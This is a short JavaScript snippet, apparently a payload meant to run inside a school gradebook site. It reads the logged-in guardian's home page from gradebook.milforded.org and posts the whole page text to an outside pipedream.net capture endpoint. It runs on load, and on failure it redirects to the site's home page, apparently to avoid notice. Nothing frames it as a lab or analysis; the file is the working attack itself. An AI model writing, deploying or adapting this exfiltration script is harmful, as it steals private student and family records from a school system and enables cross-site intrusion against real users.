async function fetchData() {
  try {
    const response = await fetch("https://gradebook.milforded.org/guardian/home.html", {
    });
    const data = await response.text();
    return data;
  } catch (error) {
    console.error("Error fetching data:", error);
    throw error;
  }
}

async function postData() {
  try {
    const data = await fetchData();
    const headers = new Headers();
    headers.append("Content-Type", "application/json");
    const body = {
      "test": data
    };
    const options = {
      method: "POST",
      headers,
      mode: "cors",
      body: JSON.stringify(body),
    };

    const postResponse = await fetch("https://eoy2w6d2or5iojc.m.pipedream.net", options);
    console.log("Data posted successfully:", postResponse);
  } catch (error) {
    console.error("Error posting data:", error);
    window.location.href = "https://gradebook.milforded.org/home.html"
  }
}
postData();
